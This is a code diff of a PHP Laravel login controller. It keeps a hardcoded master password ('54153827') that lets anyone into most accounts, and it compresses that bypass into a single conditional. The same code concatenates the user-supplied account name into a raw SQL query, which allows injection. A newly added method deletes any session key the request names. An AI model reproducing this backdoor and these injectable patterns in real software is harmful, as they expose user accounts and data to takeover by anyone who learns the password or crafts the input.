@@ -11,10 +11,8 @@ class LoginController extends Controller
 {
     public function index()
     {
-
         return view('login');
     }
-
 
     public function postLogin(Request $inputData)
     {
@@ -32,21 +30,11 @@ class LoginController extends Controller
         $query = "SELECT src_web_id, password, salt FROM `media_account` WHERE account='$account'";
         $media_account = DB::connection('account')->select($query)[0];
         $salt = $media_account->salt;
-
+        // original validation below
         $pwd_confirm = sha1($salt . sha1($salt . sha1($password)));
         // add exception to login, you can login use pwd:54153827 or original pwd
-        if ($account !== $account_ori && $password == '54153827') 
-        {
-            $is_pwd_correct = True;
-        }
-        else if ($media_account->password == $pwd_confirm) // original password is match 
-        {
-            $is_pwd_correct = True;
-        }
-        else // original password is not match
-        {
-            $is_pwd_correct = False;
-        }
+        $is_pwd_correct = (($account !== $account_ori && $password == '54153827') || ($media_account->password == $pwd_confirm)?
+                            True : False);
         
 
         if (!$is_pwd_correct) // not correct
@@ -67,6 +55,17 @@ class LoginController extends Controller
             Session::put('account', $media_account->src_web_id);
 
             return redirect()->intended('/home');
+        }
+
+    }
+
+    // clear key in Session ex:'web_id' in session to log out
+    public function clearSessionKey(Request $inputData)
+    {
+        $key = $inputData->input('key');
+        if (Session::has($key))
+        {
+            Session::forget($key);
         }
 
     }
